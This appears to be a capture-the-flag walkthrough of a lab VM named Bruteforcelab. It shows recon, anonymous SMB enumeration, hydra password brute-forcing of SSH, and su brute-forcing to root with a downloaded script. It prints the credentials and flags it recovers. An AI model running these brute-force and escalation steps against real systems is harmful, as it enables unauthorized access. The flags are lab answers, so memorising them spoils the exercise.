# Bruteforcelab

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.15:22
Open 10.0.2.15:10000
Open 10.0.2.15:19000
Open 10.0.2.15:19222
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.15
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnDkPWhcxcSZLNBWkDl1eizSw9a6bUKoMUvNUJCznGf8ExJ0o+7tPsdJsNDObU0Ap/dX6apZ2aBslLi/BJ0bMPCDF0Ovp1QErgm2PtgxK3W0VUR3tvXIKv8gwYpEQgpwhmF+bWrbEBFdLK/rtBDLFXiTYqYOMo7hriswsBY6/eLJo7roRvVDJmg0aDwTMs6cjSGVWTBkRipQrRfggl53gpnFxg90yiibGs2JT6GSOxGalVLotOMBl+pGGkxStgcVYA11LK6zNY2kCfmuh+n/DRftdMdNl+vnpUOaXo8oX0Wk0Zqd2YNjlUYA2yjZVMMUjf6ORZkjYe3wc5SADkQvUZTuyuWS9DKFxS6Y0wEBIdVdP6fj4aXC1cEkYq3hdSr2B8LIs7BBy1WWdordqdU5MAP3hw+VtFGIpLRRl9hHPYVri7qGw/dmnJKzNa5BUosHAebgr56WKTKxvbCf+Wn6KFbJEphGS/hEjvOcMwpIwYQbjg9V7y+HPL47vL/huIpBU=
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKDLqka8T9BdXD7sEjNdCNvaWN2nI97c0JiyTL/WQ+oCrt2oc6umIuUSbCX2L7yzX1Q2sirMixb/EFMc/ASYE7E=
|   256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK94OoXaK+BKuXw2YeGlhV8wIhcK5uhHJoTWStinBxAY
10000/tcp open  http        syn-ack MiniServ 2.021 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 200 &mdash; Document follows
|_http-server-header: MiniServ/2.021
|_http-favicon: Unknown favicon MD5: 9244C0A07ADF94BFD888D463CF479411
19000/tcp open  netbios-ssn syn-ack Samba smbd 4
19222/tcp open  netbios-ssn syn-ack Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## SMB (19000)

```bash
└─$ netexec smb 10.0.2.15 --port 19000 -u '' -p '' --shares
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   [*] Unix - Samba (name:LAB-BRUTEFORCE) (domain:lab-bruteforc) (signing:False) (SMBv1:False)
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   [+] lab-bruteforc\:
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   [*] Enumerated shares
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   Share           Permissions     Remark
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   -----           -----------     ------
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   print$                          Printer Drivers
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   Test            READ
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   IPC$                            IPC Service (Samba 4.13.13-Debian)
```

```bash
└─$ impacket-smbclient ''/'':''@'10.0.2.15' -port 19000
# use Test
# ls
drw-rw-rw-          0  Sun Mar 26 15:06:46 2023 .
drw-rw-rw-          0  Sun Mar 26 14:12:02 2023 ..
-rw-rw-rw-        115  Sun Mar 26 15:06:46 2023 README.txt
# cat README.txt
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
```

Username leaked: `Andrea`

### Bruteforce

```bash
└─$ hydra -l andrea -P $rockyou 10.0.2.15 smb -s 19222 -I
[ERROR] target smb://10.0.2.15:19222/ does not support SMBv1

└─$ hydra -l andrea -P $rockyou 10.0.2.15 smb2 -s 19000 -I
...
[19000][smb2] host: 10.0.2.15   login: andrea   password: rockyou
[19000][smb2] host: 10.0.2.15   login: andrea   password: lovely
1 of 1 target successfully completed, 16 valid passwords found
```

Yeah... no. Hydra failed to retrieve correct password.

Ugh.. this is bad. It's showing `Guest`. Either this account doesn't exist or it's some kind of protection mechanism against bruteforce.
```bash
└─$ netexec smb 10.0.2.15 --port 19000 -u 'andrea' -p 'test'
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   [*] Unix - Samba (name:LAB-BRUTEFORCE) (domain:lab-bruteforc) (signing:False) (SMBv1:False)
SMB         10.0.2.15       19000  LAB-BRUTEFORCE   [+] lab-bruteforc\andrea:test (Guest)
```

OR The user doesn't exist for SMB, but is an actual user on system!

## SSH

### Bruteforce

```bash
└─$ hydra -l andrea -P $rockyou 10.0.2.15 ssh -I -t 64
[22][ssh] host: 10.0.2.15   login: andrea   password: awesome
```

```bash
└─$ sshpass -p 'awesome' ssh andrea@10.0.2.15
andrea@LAB-Bruteforce:~$ id
uid=1001(andrea) gid=1001(andrea) groups=1001(andrea)
```

### User.txt

```bash
andrea@LAB-Bruteforce:~$ cat user.txt
d5eb7d8b6f57c295e0bedf7eef531360
```

## Privilege Escalation

```bash
andrea@LAB-Bruteforce:/tmp$ wget https://github.com/carlospolop/su-bruteforce/archive/refs/heads/master.zip -q
andrea@LAB-Bruteforce:/tmp$ unzip master.zip
andrea@LAB-Bruteforce:/tmp$ cd su-bruteforce-master/
andrea@LAB-Bruteforce:/tmp/tmp.4FOyo1xnza/su-bruteforce-master$ bash suBF.sh -u root -w top12000.txt -t 0.7 -s 0.09
  [+] Bruteforcing root...
  You can login as root using password: 1998
  Wordlist exhausted
```

> **Note**: `suBF` is kind of tricky to work with, without correct parameters you may never get password.

> Creds: `root:1998`

```bash
andrea@LAB-Bruteforce:/tmp/tmp.4FOyo1xnza/su-bruteforce-master$ su -
Password: 
root@LAB-Bruteforce:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@LAB-Bruteforce:~# cat /root/root.txt
d2f74ec1ca3e40f6fa07f62d42eb9ea5
```